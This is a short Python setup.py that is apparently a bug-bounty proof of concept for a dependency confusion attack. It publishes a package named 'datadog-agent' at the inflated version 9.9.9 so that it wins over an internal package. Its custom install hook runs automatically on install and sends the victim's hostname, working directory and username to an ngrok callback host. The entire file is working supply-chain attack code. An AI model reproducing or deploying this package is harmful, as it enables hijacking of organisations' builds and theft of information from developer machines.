#source:- https://github.com/007divyachawla/python-dependency-confusion-attack/blob/main/setup.py
#author:- hackerone.com/mega7
from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://65e4-156-205-162-99.eu.ngrok.io",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream


setup(name='datadog-agent', #package name
      version='9.9.9',
      description='',
      author='mega707',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})

